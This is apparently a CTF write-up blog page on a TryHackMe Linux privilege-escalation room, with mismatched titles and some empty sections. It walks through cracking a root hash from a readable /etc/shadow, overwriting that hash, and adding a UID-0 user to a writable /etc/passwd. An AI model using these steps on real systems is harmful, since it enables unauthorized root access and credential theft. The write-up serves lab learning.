@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Try Hack Me - CC Pen testing :: atomloop — TryHackMe, HackTheBox, Vulnhub,  CTF Writeups</title>    
+  
+
+<link rel="canonical" href="https://atomloop.github.io/posts/hashes/" />
+
+
+<link rel="stylesheet" href="https://atomloop.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://atomloop.github.io/style.css">
+
+
+<link rel="shortcut icon" href="https://atomloop.github.io/img/favicon.png">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>
+
+
+
+<a name="top"></a>
+</head>
+
+<body class="dark-theme">
+  
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+<span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+<polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">atomloop | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+<nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    <li><a href="/about">About</a></li>
+    <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+    <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+     <li><a href="/tags/vulnhub/"><img class="icon" src="/vulnhub.ico" width="32" title="vuln hub"></a></li>
+      <li><a href="/archive">Archive</a></li>
+  </ul>
+
+
+
+  <ul class="menu__inner menu__inner--mobile">      
+    <li><a href="/about">About</a></li>       
+    <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
+    <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
+    <li><a href="/tags/vulnhub/"><img class="icon" src="/vulnhub.ico" width="32" title="vuln hub"></a></li>
+     <li><a href="/archive">Archive</a></li>
+ </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+    </span>
+  </span>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title">Try Hack Me - Vulnversity </h4>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          <i class="fas fa-calendar-week"></i>
+            Tuesday, Aug 28, 2020
+        </span>
+      
+      <span class="post-author">— Written by atomloop</span>
+      
+        <span class="post-read-time">— 8 min read</span>
+
+    
+         <img src="https://atomloop.github.io/image/tryhackme/pentesting/cover.png" class="post-cover center" />
+
+
+         <table>
+          <thead>
+            <tr>
+              <td>Room Name</td>
+              <td>Vulnversity</td>
+            </tr>
+          </thead>
+          <tbody>
+             <tr>
+               <td>Room Type</td>
+               <td> WalkThroughs</td>
+             </tr>
+           </tbody>
+           <tbody>
+             <tr>
+               <td>Room Code </td>
+               <td>ccpentesting</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td>Points </td>
+               <td>96</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td>Dificulty </td>
+               <td>Easy</td>
+             </tr>
+           </tbody>
+
+           <tbody>
+             <tr>
+               <td> Room Created by </td>
+               <td><a href="https://tryhackme.com/p/tryhackme">tryhackme</a></td>
+             </tr>
+           </tbody>
+        </table>
+</div>   
+
+
+
+
+
+
+
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Linux PrivEsc</title><style>
+/* webkit printing magic: print all background colors */
+html {
+  -webkit-print-color-adjust: exact;
+}
+* {
+  box-sizing: border-box;
+  -webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+  margin: 0;
+  padding: 0;
+}
+@media only screen {
+  body {
+    margin: 2em auto;
+    max-width: 900px;
+    color: rgb(55, 53, 47);
+  }
+}
+
+body {
+  line-height: 1.5;
+  white-space: pre-wrap;
+}
+
+a,
+a.visited {
+  color: inherit;
+  text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+  font-size: 80%;
+  color: #444;
+}
+
+h1,
+h2,
+h3 {
+  letter-spacing: -0.01em;
+  line-height: 1.2;
+  font-weight: 600;
+  margin-bottom: 0;
+}
+
+.page-title {
+  font-size: 2.5rem;
+  font-weight: 700;
+  margin-top: 0;
+  margin-bottom: 0.75em;
+}
+
+h1 {
+  font-size: 1.875rem;
+  margin-top: 1.875rem;
+}
+
+h2 {
+  font-size: 1.5rem;
+  margin-top: 1.5rem;
+}
+
+h3 {
+  font-size: 1.25rem;
+  margin-top: 1.25rem;
+}
+
+.source {
+  border: 1px solid #ddd;
+  border-radius: 3px;
+  padding: 1.5em;
+  word-break: break-all;
+}
+
+.callout {
+  border-radius: 3px;
+  padding: 1rem;
+}
+
+figure {
+  margin: 1.25em 0;
+  page-break-inside: avoid;
+}
+
+figcaption {
+  opacity: 0.5;
+  font-size: 85%;
+  margin-top: 0.5em;
+}
+
+mark {
+  background-color: transparent;
+}
+
+.indented {
+  padding-left: 1.5em;
+}
+
+hr {
+  background: transparent;
+  display: block;
+  width: 100%;
+  height: 1px;
+  visibility: visible;
+  border: none;
+  border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+  max-width: 100%;
+}
+
+@media only print {
+  img {
+    max-height: 100vh;
+    object-fit: contain;
+  }
+}
+
+@page {
+  margin: 1in;
+}
+
+.collection-content {
+  font-size: 0.875rem;
+}
+
+.column-list {
+  display: flex;
+  justify-content: space-between;
+}
+
+.column {
+  padding: 0 1em;
+}
+
+.column:first-child {
+  padding-left: 0;
+}
+
+.column:last-child {
+  padding-right: 0;
+}
+
+.table_of_contents-item {
+  display: block;
+  font-size: 0.875rem;
+  line-height: 1.3;
+  padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+  margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+  margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+  margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+  text-decoration: none;
+  opacity: 0.7;
+  border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+  border: 1px solid rgba(55, 53, 47, 0.09);
+  border-collapse: collapse;
+}
+
+table {
+  border-left: none;
+  border-right: none;
+}
+
+th,
+td {
+  font-weight: normal;
+  padding: 0.25em 0.5em;
+  line-height: 1.5;
+  min-height: 1.5em;
+  text-align: left;
+}
+
+th {
+  color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+  margin: 0;
+  margin-block-start: 0.6em;
+  margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+  margin-block-start: 0.6em;
+}
+
+ul > li {
+  list-style: disc;
+}
+
+ul.to-do-list {
+  text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+  list-style: none;
+}
+
+.to-do-children-checked {
+  text-decoration: line-through;
+  opacity: 0.375;
+}
+
+ul.toggle > li {
+  list-style: none;
+}
+
+ul {
+  padding-inline-start: 1.7em;
+}
+
+ul > li {
+  padding-left: 0.1em;
+}
+
+ol {
+  padding-inline-start: 1.6em;
+}
+
+ol > li {
+  padding-left: 0.2em;
+}
+
+.mono ol {
+  padding-inline-start: 2em;
+}
+
+.mono ol > li {
+  text-indent: -0.4em;
+}
+
+.toggle {
+  padding-inline-start: 0em;
+  list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+  padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+  margin-left: -1.1em;
+}
+
+.selected-value {
+  display: inline-block;
+  padding: 0 0.5em;
+  background: rgba(206, 205, 202, 0.5);
+  border-radius: 3px;
+  margin-right: 0.5em;
+  margin-top: 0.3em;
+  margin-bottom: 0.3em;
+  white-space: nowrap;
+}
+
+.collection-title {
+  display: inline-block;
+  margin-right: 1em;
+}
+
+time {
+  opacity: 0.5;
+}
+
+.icon {
+  display: inline-block;
+  max-width: 1.2em;
+  max-height: 1.2em;
+  text-decoration: none;
+  vertical-align: text-bottom;
+  margin-right: 0.5em;
+}
+
+img.icon {
+  border-radius: 3px;
+}
+
+.user-icon {
+  width: 1.5em;
+  height: 1.5em;
+  border-radius: 100%;
+  margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+  font-size: 0.8em;
+}
+
+.text-icon {
+  border: 1px solid #000;
+  text-align: center;
+}
+
+.page-cover-image {
+  display: block;
+  object-fit: cover;
+  width: 100%;
+  height: 30vh;
+}
+
+.page-header-icon {
+  font-size: 3rem;
+  margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+  margin-top: -0.72em;
+  margin-left: 0.07em;
+}
+
+.page-header-icon img {
+  border-radius: 3px;
+}
+
+.link-to-page {
+  margin: 1em 0;
+  padding: 0;
+  border: none;
+  font-weight: 500;
+}
+
+p > .user {
+  opacity: 0.5;
+}
+
+td > .user,
+td > time {
+  white-space: nowrap;
+}
+
+input[type="checkbox"] {
+  transform: scale(1.5);
+  margin-right: 0.6em;
+  vertical-align: middle;
+}
+
+p {
+  margin-top: 0.5em;
+  margin-bottom: 0.5em;
+}
+
+.image {
+  border: none;
+  margin: 1.5em 0;
+  padding: 0;
+  border-radius: 0;
+  text-align: center;
+}
+
+.code,
+code {
+  background: rgba(135, 131, 120, 0.15);
+  border-radius: 3px;
+  padding: 0.2em 0.4em;
+  border-radius: 3px;
+  font-size: 85%;
+  tab-size: 2;
+}
+
+code {
+  color: #eb5757;
+}
+
+.code {
+  padding: 1.5em 1em;
+}
+
+.code-wrap {
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+
+.code > code {
+  background: none;
+  padding: 0;
+  font-size: 100%;
+  color: inherit;
+}
+
+blockquote {
+  font-size: 1.25em;
+  margin: 1em 0;
+  padding-left: 1em;
+  border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+  text-decoration: none;
+  max-height: 8em;
+  padding: 0;
+  display: flex;
+  width: 100%;
+  align-items: stretch;
+}
+
+.bookmark-title {
+  font-size: 0.85em;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  height: 1.75em;
+  white-space: nowrap;
+}
+
+.bookmark-text {
+  display: flex;
+  flex-direction: column;
+}
+
+.bookmark-info {
+  flex: 4 1 180px;
+  padding: 12px 14px 14px;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+}
+
+.bookmark-image {
+  width: 33%;
+  flex: 1 1 180px;
+  display: block;
+  position: relative;
+  object-fit: cover;
+  border-radius: 1px;
+}
+
+.bookmark-description {
+  color: rgba(55, 53, 47, 0.6);
+  font-size: 0.75em;
+  overflow: hidden;
+  max-height: 4.5em;
+  word-break: break-word;
+}
+
+.bookmark-href {
+  font-size: 0.75em;
+  margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+  color: rgb(155,154,151);
+}
+.highlight-brown {
+  color: rgb(100,71,58);
+}
+.highlight-orange {
+  color: rgb(217,115,13);
+}
+.highlight-yellow {
+  color: rgb(223,171,1);
+}
+.highlight-teal {
+  color: rgb(15,123,108);
+}
+.highlight-blue {
+  color: rgb(11,110,153);
+}
+.highlight-purple {
+  color: rgb(105,64,165);
+}
+.highlight-pink {
+  color: rgb(173,26,114);
+}
+.highlight-red {
+  color: rgb(224,62,62);
+}
+.highlight-gray_background {
+  background: rgb(235,236,237);
+}
+.highlight-brown_background {
+  background: rgb(233,229,227);
+}
+.highlight-orange_background {
+  background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+  background: rgb(251,243,219);
+}
+.highlight-teal_background {
+  background: rgb(221,237,234);
+}
+.highlight-blue_background {
+  background: rgb(221,235,241);
+}
+.highlight-purple_background {
+  background: rgb(234,228,242);
+}
+.highlight-pink_background {
+  background: rgb(244,223,235);
+}
+.highlight-red_background {
+  background: rgb(251,228,228);
+}
+.block-color-default {
+  color: inherit;
+  fill: inherit;
+}
+.block-color-gray {
+  color: rgba(55, 53, 47, 0.6);
+  fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+  color: rgb(100,71,58);
+  fill: rgb(100,71,58);
+}
+.block-color-orange {
+  color: rgb(217,115,13);
+  fill: rgb(217,115,13);
+}
+.block-color-yellow {
+  color: rgb(223,171,1);
+  fill: rgb(223,171,1);
+}
+.block-color-teal {
+  color: rgb(15,123,108);
+  fill: rgb(15,123,108);
+}
+.block-color-blue {
+  color: rgb(11,110,153);
+  fill: rgb(11,110,153);
+}
+.block-color-purple {
+  color: rgb(105,64,165);
+  fill: rgb(105,64,165);
+}
+.block-color-pink {
+  color: rgb(173,26,114);
+  fill: rgb(173,26,114);
+}
+.block-color-red {
+  color: rgb(224,62,62);
+  fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+  background: rgb(235,236,237);
+}
+.block-color-brown_background {
+  background: rgb(233,229,227);
+}
+.block-color-orange_background {
+  background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+  background: rgb(251,243,219);
+}
+.block-color-teal_background {
+  background: rgb(221,237,234);
+}
+.block-color-blue_background {
+  background: rgb(221,235,241);
+}
+.block-color-purple_background {
+  background: rgb(234,228,242);
+}
+.block-color-pink_background {
+  background: rgb(244,223,235);
+}
+.block-color-red_background {
+  background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+  display: inline-flex;
+  vertical-align: text-bottom;
+  width: 16;
+  height: 16;
+  background-size: 16px;
+  margin-left: 2px;
+  margin-right: 5px;
+}
+
+.checkbox-on {
+  background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+  background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+  
+</style></head><body><article id="6db1591c-bfeb-4930-9d09-924234b511e6" class="page sans"><header><h1 class="page-title">Linux PrivEsc</h1><table class="properties"><tbody></tbody></table></header><div class="page-body"><p id="1b59c4ac-4334-437a-92aa-32a0d61160b0" class="">Linux PrivEsc</p><p id="78ef85f4-b142-4e4c-b1ac-f8d6c3c7ad1c" class="">lets us see some intro about privilege escalation,Privileges means what a user is permitted to do,Privilege escalation means escalation(gain more permissions) then what privilege is allocated. </p><p id="b031770a-c3bd-4e2a-9ceb-79e0a24dcaec" class="">In  UNIX os every single file and folder stored on the hard drive has a set of permissions associated with it, which says who is allowed to do what with the file.</p><p id="e8281b30-00b7-4095-b3d8-0457573f8d9f" class="">It is just to understand the basic fact that a user can not access (read/write/execute) files that he is not permitted to access. However, the superuser(root) can access all the files which are present on the system. In order to change any important configuration or perform any further attack, first, we need to get root access on any Linux based system.</p><p id="28e69c64-ff41-43da-ae48-ed13a4136dc0" class="">
+</p><p id="f03f9bbf-379c-453c-bc03-ab2cd52e82c2" class="">Why do we need to perform privilege escalation?</p><ul id="9db03dc4-33b1-4471-aab6-acb5a7dcbff7" class="bulleted-list"><li><strong>Read/Write any sensitive file</strong></li></ul><ul id="7836c058-990e-4c95-8e19-a538bbc76236" class="bulleted-list"><li><strong>Persist easily between reboots</strong></li></ul><ul id="ff584a1f-b5c8-4152-a943-ee84e3c5ce01" class="bulleted-list"><li><strong>Insert a permanent backdoor</strong></li></ul><p id="89a55662-0cf7-400a-95a9-44d3149541cf" class="">
+</p><p id="d2183568-16a0-4330-82ac-12b1bec324f2" class="">Privilege escalation  are two types,horizontal and vertical:- </p><p id="8aa41e6c-222d-4452-a0f6-9fa78d7c95fc" class=""><strong>horizontal privilege escalation</strong>  is gaining  access to the user who has same permission has a current user.</p><p id="e88d8502-cdc8-4e5f-99a5-7b1b469c916e" class=""><strong>Vertical privilege escalation</strong> is gaining access to user who has higher privilege then current user. </p><p id="3fa5d3e5-8047-4449-8bab-feb4132ed1ee" class="">
+</p><h3 id="d38b896c-2cac-4d86-84c0-188401a7a842" class=""><mark class="highlight-teal">[Task 1] Deploy the Vulnerable Debian VM</mark></h3><p id="aca31fcf-0a88-4aaf-bf10-c09745d6dfc9" class="">This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. let&#x27;s start with deploying the machine. make sure that you are connected to VPN. you can log in to the target machine using </p><pre id="43c4daf6-3e5f-4060-a472-1690459a0533" class="code"><code>ssh@machine IP 
+password: password321</code></pre><pre id="c6f72538-c940-40ec-951e-dfd12adeeefa" class="code"><code>Atom:~$ ssh user@10.10.186.84
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
+
+user@debian:~$ id
+<del>uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)</del></code></pre><p id="f6eac3c5-8450-4492-93e2-c454b0b618bd" class="block-color-teal">
+</p><h3 id="5c75ab7a-1ba3-4e97-a18c-979b5a89d664" class="block-color-teal">[Task 2] Service Exploits</h3><p id="a2ea9d7e-4c1a-4719-9047-e41aecf0d5c7" class="">
+</p><p id="dc29b04a-2fee-4231-87e9-64528ad9cf3c" class="">
+</p><p id="75ea9f9a-9260-478a-b617-6dc54b273aef" class="">
+</p><p id="ea728430-8d18-4779-9a17-2c4986e5c1ea" class="">
+</p><p id="b3c4f4ac-f77c-4dd5-8aab-7fbccd3ed739" class="">
+</p><p id="e2c8a67a-e5f1-4070-b844-3216a2216d4b" class="">
+</p><p id="a613b305-0155-428b-8a28-a995833b9c7f" class="">
+</p><p id="564113b1-cfe7-4ebf-8535-65646dab7d20" class="">
+</p><h3 id="bbfae63a-6407-466d-888f-abb0b2e24313" class=""><mark class="highlight-teal">[Task 3] Weak File Permissions - Readable /etc/shadow</mark></h3><pre id="01789d97-8778-4742-89b9-2b0bbb5d3403" class="code"><code>user@debian:~$ ls -al /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow</code></pre><p id="0ed4961c-bcaf-4b17-939f-91d28a9fa3a8" class="">The /etc/shadow file contains user password hashes and is usually readable only by the root user. but here the user has not a root user. even though he is not a sudo user he can able to view the sudo file, this is a  misconfiguration by a root . this misconfiguration leads the user to gain access to a root shell  by cracking the hashes on the shadow file    </p><pre id="f7330740-b145-4626-89e5-fe89378eb23c" class="code"><code>user@debian:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</code></pre><p id="be53d3a7-c336-4d8a-885a-e7d306466c9b" class="">the string between the first colon and the second colon are the hash of the password, let&#x27;s crack it by <strong>hashcat</strong> . to crack the hash from hashcat we need to what type of the hash it is and its mode, we can find it using hash-identifier. if you are not familiar with hash and how to crack it. I&#x27;ve done a <a href="https://atomloop.github.io/posts/crackthehash/">writeup</a> regarding hash. </p><pre id="2ae7e32f-6b95-4617-985b-b17f9edd8e2a" class="code"><code>Atom:~/Downloads$ hashcat -m 1800 -a 0 --show hash.txt rockyou.txt --force
+<del>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:passw#########</del></code></pre><pre id="9e952d44-32bc-46a3-9007-87ae3154bd5f" class="code"><code>Atom $  hashcat -m 1800 -a 0  user.txt /mnt/c/Users/pounr/Documents/rockyou.txt       
+hashcat (v6.0.0) starting...
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:pa#######
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIy...fGxJI0
+Time.Started.....: Mon Sep  7 14:27:25 2020 (2 secs)
+Time.Estimated...: Mon Sep  7 14:27:27 2020 (0 secs)
+Guess.Base.......: File (/mnt/c/Users/pounr/Documents/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     1064 H/s (7.50ms) @ Accel:128 Loops:64 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 2048/14344386 (0.01%)
+Rejected.........: 0/2048 (0.00%)
+Restore.Point....: 1024/14344386 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidates.#1....: bethany -&gt; queen</code></pre><h3 id="4224fe35-d421-4905-96e5-35a579746bd5" class=""><mark class="highlight-teal">[Task 4] Weak File Permissions - Writable /etc/shadow</mark></h3><pre id="07fefd3b-af73-485d-b3a1-2eb1a0180027" class="code"><code>user@debian:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</code></pre><p id="fd15ca51-2183-4604-b2a6-5fb97fe06b69" class="">/etc/shadow file on the VM is world-readable writable: which means we can able add or modify hash.  so what we do here is, we know what type , the Linux uses to store the password hash . we have  write permission to the shadow file. so we can generate  our own password hash, and edit  it to etc/shadow file on root user </p><pre id="1d09ea7c-3650-471b-b5d0-3c4c3d6b205a" class="code"><code>Atom $ mkpasswd -m sha-512 owernewpass    
+$6$mjXiOUjX/QxukESZ$mR/xsbddm9OyyG2eLl4IdKFOKEyd6E5/a8FvlaXTaK.fDFL1UiJDaNGp5ua5d221MQoxPXbvEALOwGlwi8Neg1    
+
+
+user@debian:~$ vim /etc/shadow  | grep &#x27;root&#x27;  
+user@debian:~$ su root      
+Password:   
+root@debian:/home/user#</code></pre><p id="e7400a2e-7818-4c15-8d0f-2abe9c8d0351" class="">now we gained root shell with our own password 🤗</p><h3 id="379c2894-8340-46bb-a1b0-4a4da8bfef01" class=""><mark class="highlight-teal">[Task 5] Weak File Permissions - Writable /etc/passwd</mark></h3><p id="2942af6e-f29f-4ab0-a1d4-88926373f981" class="">there are two files don&#x27;t confuse both of the /etc/passwd  file contains information about user accounts. and /etc/shadow file contain the hashes of the users accounts passwords </p><p id="bd4bf0a3-78bf-4095-89a6-81fd94a20754" class="">but  /etc/passwd file have more preference then /etc/shadow  file .  in  some versions of Linux will still allow password hashes to be stored /etc/passwd  . for example   if you store the password hash that you generated for root user to /etc/passwd file . you can get access shell,  no mater what hash in /etc/shadow file  for the user root . the hashes in /etc/passwd file have higher priority  </p><pre id="2a7d56b5-38aa-4f38-9170-393733416aec" class="code"><code>user@debian:~$ ls -l /etc/passwd            
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd</code></pre><p id="5046c778-9bae-4139-baf9-23d5cd79b3d0" class="">/etc/passwd file is world-writable. so lets create user and password as our wish and add it to /etc/passwd file  </p><p id="efbd6577-a89c-474e-b9df-d2a3ad579d53" class="">
+</p><pre id="7a73f72c-6222-4334-8609-53c61a387f29" class="code"><code>Atom $ mkpasswd -m SHA-512 owernewpass
+$6$zRULwUHAfiBOkIuq$2BTyvSB3YqmL6uBiArUcFJwvi5QH9qXkXxA3DR8N4xFDvx9p1WfzW9AKLDCS1KiZK4QyqOyEqf6SzZcC63ZYY0</code></pre><p id="43542a8f-4879-457f-b02e-358afa5ff8bd" class="">we just created password hash for newroot user </p><pre id="ceb8d8e4-f403-4735-a82b-d0cfa918d21d" class="code"><code>root:x:0:0:root:/root:/bin/bash
+newroot:$6$zRULwUHAfiBOkIuq$2BTyvSB3YqmL6uBiArUcFJwvi5QH9qXkXxA3DR8N4xFDvx9p1WfzW9AKLDCS1KiZK4QyqOyEqf6SzZcC63ZYY0:0:0:root:/root:/bin/bash  </code></pre><p id="d7871ac4-dcf9-453b-9e7f-a74236a04720" class=""> i just created a new root user  with help of previous root user&#x27;s information . and added hash in the place of x  .  </p><blockquote id="d372c8f4-4541-46be-98ff-496950c0eb8d" class="">note : dont paste  newroot user information on top of the /etc/passwd file </blockquote><p id="8e2a9f3f-61fa-4129-9d10-8a88122ddac8" class="">
+</p><h3 id="0ddc30b8-294f-4008-80a2-e36764db8348" class=""><mark class="highlight-teal">[Task 6] Sudo - Shell Escape Sequences</mark></h3><p id="138b376a-c07c-492d-bba4-a20cd9f03bd9" class="">
+</p><p id="4a841f0f-d028-46f2-b663-534c6ca93086" class=""><code>sudo -l</code> is a command is used to display the programs which sudo allows your user to run: </p><pre id="ccd30019-aa5b-454a-8897-f3aa301e7926" class="code"><code>user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more</code></pre><p id="bcfeb3a8-f7b9-4635-9d73-abb886061fbf" class="">
+</p></div></article></body></html>
+
+
+
+
+
+
+      
+  </div>
+  
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">atomloop | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span style="font-size: 0.85em;">© 2020 atomloop</span>
+        
+      
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://atomloop.github.io/assets/main.js"></script>
+<script src="https://atomloop.github.io/assets/prism.js"></script>
+
+
+
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+  
